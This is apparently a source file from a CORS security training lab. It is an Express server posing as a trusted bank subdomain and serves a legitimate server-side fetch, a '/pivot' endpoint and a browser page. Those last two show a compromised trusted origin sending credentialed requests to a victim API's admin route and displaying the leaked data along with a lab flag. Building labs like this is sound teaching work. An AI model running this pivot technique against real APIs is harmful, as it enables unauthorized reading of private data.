/**
 * app.js — Trusted Subdomain Server (reports.bank.local)
 * ════════════════════════════════════════════════════════
 * This server simulates a legitimate subdomain that the victim API trusts.
 *
 * It has two roles in the lab:
 *
 *   1. LEGITIMATE USE — serves report data, trusted by the victim API.
 *      GET /reports → fetches from victim API with trusted origin header.
 *      This is normal cross-origin usage working correctly.
 *
 *   2. PIVOT DEMONSTRATION — simulates what happens if this subdomain
 *      were compromised (XSS, subdomain takeover, etc.).
 *      GET /pivot → makes a cross-origin request to /api/admin on the
 *      victim API, using localhost:3001 as origin — which is trusted.
 *      If Bug #6 exists, the admin data flows back to the attacker.
 *
 * Port: 3001
 * Origin: http://localhost:3001 (seen by victim API)
 */

'use strict';

const express = require('express');

const app  = express();
const PORT = process.env.PORT || 3001;

// The victim API URL — from browser perspective (localhost) and
// from container perspective (victim-api service name)
const VICTIM_API_BROWSER = 'http://localhost:3000';
const VICTIM_API_INTERNAL = process.env.VICTIM_API_URL || 'http://localhost:3000';

app.use(express.json());

// ─── HEALTH ───────────────────────────────────────────────────────────────────
app.get('/health', (req, res) => {
  res.json({ status: 'ok', server: 'reports.bank.local', port: PORT });
});

// ─── LEGITIMATE CROSS-ORIGIN USE ─────────────────────────────────────────────

/**
 * GET /reports
 * Legitimate server-to-server fetch from victim API.
 * Demonstrates that CORS is a browser mechanism — server-to-server
 * requests are NOT restricted by CORS. This is a critical concept
 * for students to understand.
 */
app.get('/reports', async (req, res) => {
  try {
    // Server-side fetch — no CORS enforcement here
    // This always works regardless of CORS config
    const response = await fetch(`${VICTIM_API_INTERNAL}/api/safe`);
    const data = await response.json();

    res.json({
      note: 'Server-to-server fetch — CORS does not apply here.',
      explanation: 'CORS is enforced by the BROWSER, not the server. ' +
                   'A server fetching from another server has no CORS restriction. ' +
                   'Only browser-based JavaScript is restricted by SOP/CORS.',
      victim_api_response: data,
    });
  } catch (err) {
    res.status(500).json({ error: 'Could not reach victim API', detail: err.message });
  }
});

// ─── PIVOT DEMONSTRATION (Exercise 02 — Bug #6) ───────────────────────────────

/**
 * GET /pivot
 * Simulates a compromised trusted subdomain.
 *
 * In a real attack:
 *   - Attacker finds XSS on reports.bank.local
 *   - Injects a script that fetches /api/admin on the victim API
 *   - Because reports.bank.local is trusted (Bug #6), the fetch succeeds
 *   - Admin data is exfiltrated to attacker infrastructure
 *
 * In this lab:
 *   - This endpoint makes that fetch server-side and returns the result
 *   - Students see exactly what data the "compromised subdomain" can access
 *   - The browser exploit page (03-regex-bypass.html) shows the browser-side version
 */
app.get('/pivot', async (req, res) => {
  try {
    // Fetch /api/admin with our trusted origin header
    const response = await fetch(`${VICTIM_API_INTERNAL}/api/admin`, {
      headers: {
        'Origin': 'http://localhost:3001',
        'Cookie': 'session=BANK_SESSION_abc123xyz',
      },
    });

    const corsHeader = response.headers.get('access-control-allow-origin');
    const data = await response.json();

    res.json({
      pivot_attack: 'reports.bank.local → /api/admin',
      cors_header_returned: corsHeader,
      explanation: 'If this server were compromised (XSS or subdomain takeover), ' +
                   'an attacker could use its trusted-origin status to read admin data.',
      admin_data_leaked: data,
    });
  } catch (err) {
    res.status(500).json({ error: 'Pivot failed', detail: err.message });
  }
});

/**
 * GET /pivot-page
 * Returns an HTML page with JavaScript that makes the cross-origin fetch
 * from the BROWSER (not server-side). This demonstrates the actual browser
 * CORS behaviour — showing the request headers and response in real time.
 */
app.get('/pivot-page', (req, res) => {
  res.setHeader('Content-Type', 'text/html');
  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Subdomain Pivot Demo — reports.bank.local</title>
  <style>
    body { font-family: monospace; background: #0d1117; color: #c9d1d9; padding: 2rem; }
    h1 { color: #f85149; }
    .info { background: #161b22; border: 1px solid #30363d; padding: 1rem; border-radius: 6px; margin: 1rem 0; }
    .output { background: #0d1117; border: 1px solid #238636; padding: 1rem; border-radius: 6px; min-height: 100px; white-space: pre-wrap; color: #3fb950; }
    button { background: #238636; color: white; border: none; padding: 0.5rem 1.5rem; border-radius: 6px; cursor: pointer; font-size: 1rem; margin-top: 1rem; }
    button:hover { background: #2ea043; }
    .flag { color: #f0c93a; font-weight: bold; font-size: 1.2rem; }
  </style>
</head>
<body>
  <h1>⚠️ Compromised Subdomain: reports.bank.local</h1>

  <div class="info">
    <strong>Scenario:</strong> This page simulates an attacker who has gained XSS 
    on <code>reports.bank.local</code> (localhost:3001).<br><br>
    Because this origin is trusted by the victim API (Bug #6), JavaScript running 
    here can make credentialed cross-origin requests to <code>/api/admin</code> 
    and read the response — as if it were the same origin.
  </div>

  <button onclick="runPivot()">▶ Execute Pivot Attack</button>

  <h3>Output:</h3>
  <div class="output" id="output">Click the button to run the cross-origin fetch from this trusted origin...</div>

  <script>
    async function runPivot() {
      const out = document.getElementById('output');
      out.textContent = 'Sending cross-origin request to http://localhost:3000/api/admin...\\n';
      out.textContent += 'Origin header: ' + window.location.origin + '\\n\\n';

      try {
        const res = await fetch('http://localhost:3000/api/admin', {
          credentials: 'include',
        });

        const corsHeader = res.headers.get('access-control-allow-origin');
        out.textContent += 'Response status: ' + res.status + '\\n';
        out.textContent += 'Access-Control-Allow-Origin: ' + corsHeader + '\\n\\n';

        if (res.ok) {
          const data = await res.json();
          out.textContent += 'DATA LEAKED:\\n' + JSON.stringify(data, null, 2) + '\\n';
          if (data.flag) {
            const flagEl = document.createElement('div');
            flagEl.className = 'flag';
            flagEl.textContent = '🚩 FLAG: ' + data.flag;
            document.body.appendChild(flagEl);
          }
        } else {
          out.textContent += 'Request blocked (status ' + res.status + ') — Bug #6 may be fixed!';
        }
      } catch (err) {
        out.textContent += 'BLOCKED by browser CORS policy:\\n' + err.message + '\\n\\n';
        out.textContent += '✅ This means the CORS config is correctly rejecting this origin.';
      }
    }
  </script>
</body>
</html>`);
});

// ─── START ────────────────────────────────────────────────────────────────────
if (require.main === module) {
  app.listen(PORT, () => {
    console.log(`\n📊  Trusted Subdomain (reports.bank.local) running on http://localhost:${PORT}`);
    console.log(`    GET /reports     → legitimate cross-origin fetch (server-side)`);
    console.log(`    GET /pivot       → compromised subdomain pivot (server-side)`);
    console.log(`    GET /pivot-page  → browser-based pivot demo\n`);
  });
}

module.exports = app;
